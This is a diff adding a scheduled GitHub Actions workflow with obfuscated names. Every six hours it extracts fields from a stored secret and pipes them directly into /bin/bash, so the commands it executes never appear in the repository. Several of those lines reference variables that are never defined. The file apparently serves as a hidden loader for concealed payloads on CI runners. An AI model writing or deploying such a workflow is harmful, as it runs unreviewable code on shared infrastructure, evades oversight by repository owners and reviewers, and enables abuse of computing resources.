@@ -1,0 +1,20 @@
+name: shenshenwulidegan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shenshenwulidegan
+        env:
+          rlmn50: ${{ secrets.rlmn50 }}
+        run: |
+          echo $rlmn50 | jq -r .acwks330 | /bin/bash
+          echo $pnt0483 | jq -r .efrz960 | /bin/bash
+          echo $bzjt83190 | jq -r .oqyx3053 | /bin/bash
+          echo $jphf77 | jq -r .pgmbm0938 | /bin/bash
+          echo $ssmw82255 | jq -r .mifqx78 | /bin/bash
+
